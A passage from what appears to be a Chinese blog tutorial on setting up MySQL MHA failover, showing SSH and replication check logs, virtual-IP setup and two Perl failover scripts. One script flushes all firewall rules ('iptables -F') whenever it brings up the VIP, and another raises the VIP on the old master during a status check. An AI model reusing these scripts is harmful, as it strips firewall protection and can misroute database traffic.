E86;&#x907F;&#x514D;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6682;&#x65F6;&#x4E3A;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x521B;&#x5EFA;&#x786C;&#x94FE;&#x63A5;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x901A;&#x8FC7;&#x786C;&#x94FE;&#x63A5;&#x5220;&#x9664;&#x5927;&#x6587;&#x4EF6;&#x901F;&#x5EA6;&#x4F1A;&#x5F88;&#x5FEB;&#x3002;&#xFF08;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x5220;&#x9664;&#x5927;&#x8868;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x4E5F;&#x91C7;&#x7528;&#x5EFA;&#x7ACB;&#x786C;&#x94FE;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#xFF09;</p><p><strong>&#xFF08;3&#xFF09;.&#x68C0;&#x67E5;SSH&#x914D;&#x7F6E;</strong></p><p>&#x68C0;&#x67E5;MHA Manger&#x5230;&#x6240;&#x6709;MHA Node&#x7684;SSH&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#xFF1A;</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; masterha_check_ssh --conf=/etc/masterha/app1.cnf</span><br><span class="line">Fri May  6 22:31:51 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Fri May  6 22:31:51 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:31:51 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:31:51 2022 - [info] Starting SSH connection tests..</span><br><span class="line">Fri May  6 22:31:54 2022 - [debug]</span><br><span class="line">Fri May  6 22:31:51 2022 - [debug]  Connecting via SSH from root@192.168.73.21(192.168.73.21:22) to root@192.168.73.22(192.168.73.22:22)..</span><br><span class="line">Fri May  6 22:31:52 2022 - [debug]   ok.</span><br><span class="line">Fri May  6 22:31:52 2022 - [debug]  Connecting via SSH from root@192.168.73.21(192.168.73.21:22) to root@192.168.73.23(192.168.73.23:22)..</span><br><span class="line">Fri May  6 22:31:53 2022 - [debug]   ok.</span><br><span class="line">Fri May  6 22:31:55 2022 - [debug]</span><br><span class="line">Fri May  6 22:31:52 2022 - [debug]  Connecting via SSH from root@192.168.73.23(192.168.73.23:22) to root@192.168.73.21(192.168.73.21:22)..</span><br><span class="line">Fri May  6 22:31:53 2022 - [debug]   ok.</span><br><span class="line">Fri May  6 22:31:53 2022 - [debug]  Connecting via SSH from root@192.168.73.23(192.168.73.23:22) to root@192.168.73.22(192.168.73.22:22)..</span><br><span class="line">Fri May  6 22:31:54 2022 - [debug]   ok.</span><br><span class="line">Fri May  6 22:31:55 2022 - [debug]</span><br><span class="line">Fri May  6 22:31:52 2022 - [debug]  Connecting via SSH from root@192.168.73.22(192.168.73.22:22) to root@192.168.73.21(192.168.73.21:22)..</span><br><span class="line">Fri May  6 22:31:53 2022 - [debug]   ok.</span><br><span class="line">Fri May  6 22:31:53 2022 - [debug]  Connecting via SSH from root@192.168.73.22(192.168.73.22:22) to root@192.168.73.23(192.168.73.23:22)..</span><br><span class="line">Fri May  6 22:31:54 2022 - [debug]   ok.</span><br><span class="line">Fri May  6 22:31:55 2022 - [info] All SSH connection tests passed successfully.</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p>&#x5404;&#x4E2A;&#x8282;&#x70B9;ssh&#x9A8C;&#x8BC1;&#x90FD;&#x662F;ok&#x624D;&#x6B63;&#x5E38;</p><p><strong>&#xFF08;4&#xFF09;.&#x68C0;&#x67E5;&#x6574;&#x4E2A;&#x590D;&#x5236;&#x73AF;&#x5883;&#x72B6;&#x51B5;</strong></p><p>&#x914D;&#x7F6E;VIP<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; ifconfig ens33</span><br><span class="line">[root@rhel7 ~]&amp; ip -4 addr show dev ens33</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    inet 192.168.73.21/24 brd 192.168.73.255 scope global ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]&amp; ip addr add 192.168.73.73/24 brd 192.168.10.255 dev ens33 label ens33:1</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]&amp; ip -4 addr show dev ens33</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    inet 192.168.73.20/24 brd 192.168.73.255 scope global ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 192.168.73.73/24 brd 192.168.10.255 scope global secondary ens33:1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x521B;&#x5EFA;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x811A;&#x672C;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; vim /usr/local/bin/master_ip_failover</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings <span class="string">FATAL =&gt;</span> <span class="string">&apos;all&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> Getopt::Long;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> (</span><br><span class="line">    $command,          $ssh_user,        $orig_master_host, $orig_master_ip,</span><br><span class="line">    $orig_master_port, $new_master_host, $new_master_ip,    $new_master_port</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $vip = <span class="string">&apos;192.168.73.73&apos;</span>;</span><br><span class="line"><span class="keyword">my</span> $brdc = <span class="string">&apos;192.168.73.255&apos;</span>;</span><br><span class="line"><span class="keyword">my</span> $ifdev = <span class="string">&apos;ens33&apos;</span>;</span><br><span class="line"><span class="keyword">my</span> $key = <span class="string">&apos;1&apos;</span>;</span><br><span class="line"><span class="keyword">my</span> $ssh_start_vip = <span class="string">&quot;/usr/sbin/ip addr add $vip/24 brd $brdc dev $ifdev label $ifdev:$key;/usr/sbin/arping -q -A -c 1 -I $ifdev:$key $vip;iptables -F;&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $ssh_stop_vip = <span class="string">&quot;/usr/sbin/ip addr del $vip/24 dev $ifdev label $ifdev:$key&quot;</span>;</span><br><span class="line"></span><br><span class="line">GetOptions(</span><br><span class="line">    <span class="string">&apos;command=s&apos;</span>          =&gt; \$command,</span><br><span class="line">    <span class="string">&apos;ssh_user=s&apos;</span>         =&gt; \$ssh_user,</span><br><span class="line">    <span class="string">&apos;orig_master_host=s&apos;</span> =&gt; \$orig_master_host,</span><br><span class="line">    <span class="string">&apos;orig_master_ip=s&apos;</span>   =&gt; \$orig_master_ip,</span><br><span class="line">    <span class="string">&apos;orig_master_port=i&apos;</span> =&gt; \$orig_master_port,</span><br><span class="line">    <span class="string">&apos;new_master_host=s&apos;</span>  =&gt; \$new_master_host,</span><br><span class="line">    <span class="string">&apos;new_master_ip=s&apos;</span>   =&gt; \$new_master_ip,</span><br><span class="line">    <span class="string">&apos;new_master_port=i&apos;</span>  =&gt; \$new_master_port,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span> &amp;main();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">main</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( $command eq <span class="string">&quot;stop&quot;</span> || $command eq <span class="string">&quot;stopssh&quot;</span> ) {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">my</span> $exit_code = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">eval</span> {</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Disabling the VIP on old master: $orig_master_host \n&quot;</span>;</span><br><span class="line">            &amp;stop_vip();</span><br><span class="line">            $exit_code = <span class="number">0</span>;</span><br><span class="line">        };</span><br><span class="line">        <span class="keyword">if</span> ($@) {</span><br><span class="line">            <span class="keyword">warn</span> <span class="string">&quot;Got Error: $@\n&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span> $exit_code;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">exit</span> $exit_code;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">elsif</span> ( $command eq <span class="string">&quot;start&quot;</span> ) {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">my</span> $exit_code = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">eval</span> {</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Enabling the VIP - $vip on the new master - $new_master_host \n&quot;</span>;</span><br><span class="line">            &amp;start_vip();</span><br><span class="line">            $exit_code = <span class="number">0</span>;</span><br><span class="line">        };</span><br><span class="line">        <span class="keyword">if</span> ($@) {</span><br><span class="line">            <span class="keyword">warn</span> $@;</span><br><span class="line">            <span class="keyword">exit</span> $exit_code;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">exit</span> $exit_code;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">elsif</span> ( $command eq <span class="string">&quot;status&quot;</span> ) {</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Checking the Status of the script.. OK \n&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        &amp;usage();</span><br><span class="line">        <span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">start_vip</span>() </span>{</span><br><span class="line">    <span class="string">`ssh $ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment"># A simple system call that disable the VIP on the old_master</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">stop_vip</span>() </span>{</span><br><span class="line">    <span class="string">`ssh $ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">usage</span> </span>{</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="string">&quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; vim /usr/local/bin/master_ip_online_change</span><br></pre></td></tr></tbody></table></figure><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings <span class="string">FATAL =&gt;</span><span class="string">&apos;all&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> Getopt::Long;</span><br><span class="line"></span><br><span class="line"><span class="comment">#my $vip = &apos;172.25.0.100/24&apos;;  # Virtual IP</span></span><br><span class="line"><span class="keyword">my</span> $vip = <span class="string">&apos;192.168.73.73/24&apos;</span>;  <span class="comment"># Virtual IP</span></span><br><span class="line"><span class="keyword">my</span> $key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $ssh_start_vip = <span class="string">&quot;/sbin/ifconfig ens33:$key $vip&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $ssh_stop_vip = <span class="string">&quot;/sbin/ifconfig ens33:$key down&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $exit_code = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> (</span><br><span class="line">  $command,              $orig_master_is_new_slave, $orig_master_host,</span><br><span class="line">  $orig_master_ip,       $orig_master_port,         $orig_master_user,</span><br><span class="line">  $orig_master_password, $orig_master_ssh_user,     $new_master_host,</span><br><span class="line">  $new_master_ip,        $new_master_port,          $new_master_user,</span><br><span class="line">  $new_master_password,  $new_master_ssh_user,</span><br><span class="line">);</span><br><span class="line">GetOptions(</span><br><span class="line">  <span class="string">&apos;command=s&apos;</span>                =&gt; \$command,</span><br><span class="line">  <span class="string">&apos;orig_master_is_new_slave&apos;</span> =&gt; \$orig_master_is_new_slave,</span><br><span class="line">  <span class="string">&apos;orig_master_host=s&apos;</span>       =&gt; \$orig_master_host,</span><br><span class="line">  <span class="string">&apos;orig_master_ip=s&apos;</span>         =&gt; \$orig_master_ip,</span><br><span class="line">  <span class="string">&apos;orig_master_port=i&apos;</span>       =&gt; \$orig_master_port,</span><br><span class="line">  <span class="string">&apos;orig_master_user=s&apos;</span>       =&gt; \$orig_master_user,</span><br><span class="line">  <span class="string">&apos;orig_master_password=s&apos;</span>   =&gt; \$orig_master_password,</span><br><span class="line">  <span class="string">&apos;orig_master_ssh_user=s&apos;</span>   =&gt; \$orig_master_ssh_user,</span><br><span class="line">  <span class="string">&apos;new_master_host=s&apos;</span>        =&gt; \$new_master_host,</span><br><span class="line">  <span class="string">&apos;new_master_ip=s&apos;</span>          =&gt; \$new_master_ip,</span><br><span class="line">  <span class="string">&apos;new_master_port=i&apos;</span>        =&gt; \$new_master_port,</span><br><span class="line">  <span class="string">&apos;new_master_user=s&apos;</span>        =&gt; \$new_master_user,</span><br><span class="line">  <span class="string">&apos;new_master_password=s&apos;</span>    =&gt; \$new_master_password,</span><br><span class="line">  <span class="string">&apos;new_master_ssh_user=s&apos;</span>    =&gt; \$new_master_ssh_user,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span> &amp;main();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">main</span> </span>{</span><br><span class="line"></span><br><span class="line"><span class="comment">#print &quot;\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $command eq <span class="string">&quot;stop&quot;</span> || $command eq <span class="string">&quot;stopssh&quot;</span> ) {</span><br><span class="line"></span><br><span class="line">        <span class="comment"># $orig_master_host, $orig_master_ip, $orig_master_port are passed.</span></span><br><span class="line">        <span class="comment"># If you manage master ip address at global catalog database,</span></span><br><span class="line">        <span class="comment"># invalidate orig_master_ip here.</span></span><br><span class="line">        <span class="keyword">my</span> $exit_code = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">eval</span> {</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;\n\n\n***************************************************************\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Disabling the VIP - $vip on old master: $orig_master_host\n&quot;</span>;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;***************************************************************\n\n\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&amp;stop_vip();</span><br><span class="line">            $exit_code = <span class="number">0</span>;</span><br><span class="line">        };</span><br><span class="line">        <span class="keyword">if</span> ($@) {</span><br><span class="line">            <span class="keyword">warn</span> <span class="string">&quot;Got Error: $@\n&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span> $exit_code;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">exit</span> $exit_code;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">elsif</span> ( $command eq <span class="string">&quot;start&quot;</span> ) {</span><br><span class="line"></span><br><span class="line">        <span class="comment"># all arguments are passed.</span></span><br><span class="line">        <span class="comment"># If you manage master ip address at global catalog database,</span></span><br><span class="line">        <span class="comment"># activate new_master_ip here.</span></span><br><span class="line">        <span class="comment"># You can also grant write access (create user, set read_only=0, etc) here.</span></span><br><span class="line"><span class="keyword">my</span> $exit_code = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">eval</span> {</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;\n\n\n***************************************************************\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Enabling the VIP - $vip on new master: $new_master_host \n&quot;</span>;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;***************************************************************\n\n\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&amp;start_vip();</span><br><span class="line">            $exit_code = <span class="number">0</span>;</span><br><span class="line">        };</span><br><span class="line">        <span class="keyword">if</span> ($@) {</span><br><span class="line">            <span class="keyword">warn</span> $@;</span><br><span class="line">            <span class="keyword">exit</span> $exit_code;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">exit</span> $exit_code;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">elsif</span> ( $command eq <span class="string">&quot;status&quot;</span> ) {</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Checking the Status of the script.. OK \n&quot;</span>;</span><br><span class="line">        <span class="string">`ssh $orig_master_ssh_user\@$orig_master_host \&quot; $ssh_start_vip \&quot;`</span>;</span><br><span class="line">        <span class="keyword">exit</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">&amp;usage();</span><br><span class="line">        <span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># A simple system call that enable the VIP on the new master</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">start_vip</span>() </span>{</span><br><span class="line"><span class="string">`ssh $new_master_ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment"># A simple system call that disable the VIP on the old_master</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">stop_vip</span>() </span>{</span><br><span class="line"><span class="string">`ssh $orig_master_ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">usage</span> </span>{</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="string">&quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;</span>;</span><br><span class="line">}</span><br><span class="line">[root@ctos7mini ~]<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6743;&#x9650;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; chmod 755 /usr/local/bin/master_ip_failover</span><br><span class="line">[root@ctos7mini ~]&amp; chmod 755 /usr/local/bin/master_ip_online_change</span><br><span class="line">[root@ctos7mini ~]&amp; grep /usr/local/bin/master_ip_failover /etc/masterha/app1.cnf</span><br><span class="line">master_ip_failover_script= /usr/local/bin/master_ip_failover</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x901A;&#x8FC7;masterha_check_repl&#x811A;&#x672C;&#x67E5;&#x770B;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x7684;&#x72B6;&#x6001;</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; masterha_check_repl --conf=/etc/masterha/app1.cnf</span><br><span class="line">Fri May  6 22:54:08 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Fri May  6 22:54:08 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:54:08 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:54:08 2022 - [info] MHA::MasterMonitor version 0.54.</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Dead Servers:</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Alive Servers:</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]   192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]   192.168.73.22(192.168.73.22:3306)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]   192.168.73.23(192.168.73.23:3306)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Alive Slaves:</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]   192.168.73.22(192.168.73.22:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabled</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]     Primary candidate for the new Master (candidate_master is set)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]   192.168.73.23(192.168.73.23:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabled</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Checking slave configurations..</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Checking replication filtering settings..</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]  binlog_do_db= ha, binlog_ignore_db= mysql</span><br><span class="line">Fri May  6 22:54:09 2022 - [info]  Replication filtering check ok.</span><br><span class="line">Fri May  6 22:54:09 2022 - [info] Starting SSH connection tests..</span><br><span class="line">Fri May  6 